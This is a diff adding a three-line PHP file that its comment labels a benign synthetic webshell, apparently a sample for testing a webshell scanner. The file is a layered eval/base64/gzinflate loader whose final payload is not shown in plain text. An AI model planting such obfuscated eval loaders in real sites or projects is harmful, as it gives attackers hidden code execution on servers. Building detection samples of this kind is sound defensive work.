@@ -1,0 +1,3 @@
+<?php
+/* SANDWORM benign synthetic webshell (multi-layer eval/base64/gzinflate). */
+eval(base64_decode('ZXZhbChnemluZmxhdGUoYmFzZTY0X2RlY29kZSgnczdFdnlDamcwdGRYQ0hiMGN3bjNEL0pWS0s3TUs4bElMY2xNVmloUFRTck9TTTNKVVhqVU1FVWhLVFV2TXoxUElTVTFOMStoSUxFeUp6OHhSWThyTlRralgwRUpwbFhYMXpISTJ6WElDcWdvUHltdHREZzVzU1ExQmFaWW9TZzFNVGtqTlNVbVQ4bWFLek5OUVNPenVEaTFSRU1sUHNnMU1OUTFPQ1JhUFRrM1JUMVdVMU9oR3VpRTRwTFVYRXc1YTRWYUxuczdBQT09JykpKQ=='));
